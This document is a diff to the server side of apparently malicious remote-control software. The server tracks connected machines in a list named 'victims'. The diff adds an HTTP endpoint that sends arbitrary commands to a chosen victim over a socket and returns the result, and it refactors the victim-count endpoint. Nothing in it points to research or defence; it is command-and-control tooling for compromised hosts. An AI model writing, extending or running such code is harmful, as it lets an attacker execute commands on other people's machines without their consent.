@@ -1,8 +1,10 @@
-from flask import jsonify
+from time import sleep
+from flask import jsonify, request
 from utils.connection_types import Client
-import socket
+import socket   
 from sys import argv
 from utils import logger
+from utils.utils import *
 from threading import Thread
 from utils.api_types import export_app
 
@@ -12,23 +14,37 @@ app = export_app()
 
 
 @app.route('/victims')
-def get_victims():
+def get_victims(): 
     global victims
-    checked = list()
 
-    for client in victims:
-        try:
-            client.conn.send('CHECK'.encode('utf-8'))
-            checked.append(client)
-        except:
-            continue
-
-    victims = checked
+    victims = check_users_connection(victims)
 
     return jsonify({
         'TOTAL SIZE': len(victims)
     })
 
+
+@app.route('/command', methods=['POST'])
+def send_command():
+    data = request.json
+
+    client_id = data.get('clientId')
+    command = data.get('command')   
+
+    if not client_id or not command:
+        return 'INVALID DATA'
+
+    for client in victims:
+        if client.client_id == client_id:
+            client.conn.send(command.encode('utf-8'))
+            client.__proccessing__ = True
+
+            while client.__proccessing__:
+                sleep(.15)
+
+            return client.__last__
+
+    return 'CALCULATE ERROR'
 
 api = Thread(target=app.run, name="API Handler 1", daemon=True,
              kwargs={'host': '0.0.0.0', 'port': 9001})
@@ -46,13 +62,13 @@ sock.bind((HOST, PORT))
 
 sock.listen(5)
 
-client_id = int()
-
 logger.warning('DADDY STARTED ', HOST, ':', PORT)
 
 while 'LISTENING':
     conn, addr = sock.accept()
-    client_id += 1
+    victims = check_users_connection(victims)
+
+    client_id = len(victims) + 1
 
     logger.info('CONNECTED: ', addr)
 
